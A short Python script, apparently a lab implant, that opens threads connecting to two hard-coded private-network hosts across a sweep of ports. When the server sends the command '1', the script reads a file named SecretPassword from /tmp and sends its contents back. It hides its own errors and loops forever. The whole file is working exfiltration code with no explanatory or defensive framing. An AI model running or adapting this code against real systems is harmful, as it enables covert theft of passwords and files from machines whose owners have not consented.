import socket
import os
import subprocess
import sys
import socket
import _thread

SERVER_HOST1 = "192.168.10.5"
SERVER_HOST2 = "192.168.10.7"
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

# Define a function for the thread
def connectTcpServer(threadName, port):
    try:
        s = socket.socket()
        if threadName == 'Thread-1':
           #flag = 1
           s.connect((SERVER_HOST1, port))
        if threadName == 'Thread-2':
           #flag = 2
           s.connect((SERVER_HOST2, port + 1))
        
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        if command == '1':
                
            splited_command = "cd /tmp".split()
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""

            command = "cat SecretPassword"
            output = subprocess.getoutput(command)

            # get the current working directory as output
            # cwd = os.getcwd()
            # send the results back to the server
            message = "result: " + str(output)
            s.send(message.encode())

    except Exception as e:
      #print(e)
      x=1


# Create two threads as follows
for port in range(1000, 4000, 40):
    try:
        _thread.start_new_thread( connectTcpServer, ("Thread-1", port, ) )
        _thread.start_new_thread( connectTcpServer, ("Thread-2", port, ) )
    except Exception as e:
        print (e)

while 1:
    pass


